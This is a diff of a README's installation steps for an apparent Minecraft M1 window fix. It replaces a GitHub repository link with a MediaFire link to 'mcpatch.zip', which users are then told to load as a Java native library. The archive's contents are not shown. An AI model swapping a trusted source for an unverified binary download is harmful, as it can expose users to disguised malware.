@@ -7,7 +7,7 @@
 
 # Installation steps (M1, MultiMC):
 
-1) Download [this](https://github.com/GameParrot/minecraft-mac-window-fix) file.
+1) Download [this](https://www.mediafire.com/file/5o67lqkkltstelb/mcpatch.zip/file) file.
 2) Unzip and place it in any directory.
 3) In MultiMC navigate to Settings --> Java --> JVM Arguments
 4) Enable them and enter "-Djava.library.path=[Folder Path]"
